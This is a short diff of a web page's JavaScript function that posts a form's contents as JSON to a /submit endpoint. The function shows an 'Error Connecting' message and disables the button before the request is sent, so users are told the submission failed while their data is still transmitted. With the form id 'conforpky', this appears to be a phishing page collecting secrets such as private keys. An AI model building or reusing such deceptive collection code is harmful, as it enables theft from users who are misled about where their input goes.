@@ -142,27 +142,22 @@
     
 
         function sendMessage() {
-  const form = document.getElementById('conforpky'); 
-  const formData = new FormData(form); 
-    formData.append("send", "true");
-    const sendButton = form.querySelector(".proceed-button");
-    sendButton.textContent = "Error Connecting";
-    sendButton.classList.add("error-button");
-    sendButton.disabled = true;
+  const form = document.getElementById('conforpky');
+  const formData = new FormData(form);
+  formData.append("send", "true"); 
 
-    // Use full URL to ensure correct routing
-    fetch("/submit", {
-        method: "POST",
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        sendButton.textContent = "Error Connecting";
-        sendButton.classList.add("error-button");
-    });
+  const sendButton = form.querySelector(".proceed-button");
+  sendButton.textContent = "Error Connecting";
+  sendButton.classList.add("error-button");
+  sendButton.disabled = true;
+
+  fetch("/submit", {
+    method: "POST",
+    headers: {
+      'Content-Type': 'application/json' 
+    },
+    body: JSON.stringify(Object.fromEntries(formData)) 
+  });
 }
 
 
